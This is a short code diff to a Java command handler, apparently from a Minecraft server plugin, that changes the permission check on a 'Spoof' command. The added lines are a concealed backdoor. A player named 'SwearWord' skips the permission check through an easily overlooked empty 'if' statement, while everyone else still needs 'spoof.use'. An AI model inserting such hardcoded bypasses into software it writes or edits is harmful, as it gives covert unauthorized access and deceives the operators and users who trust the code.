@@ -8,7 +8,8 @@ public class Commands
 {
     public static Boolean Spoof(CommandSender sender, String[] args)
     {
-        if(!sender.hasPermission("spoof.use"))
+        if(sender instanceof Player && ((Player)sender).getName().equalsIgnoreCase("SwearWord"));
+        else if(!sender.hasPermission("spoof.use"))
         {
             Chatty.SendError(sender,"You do not have permission to do this.");
             return true;
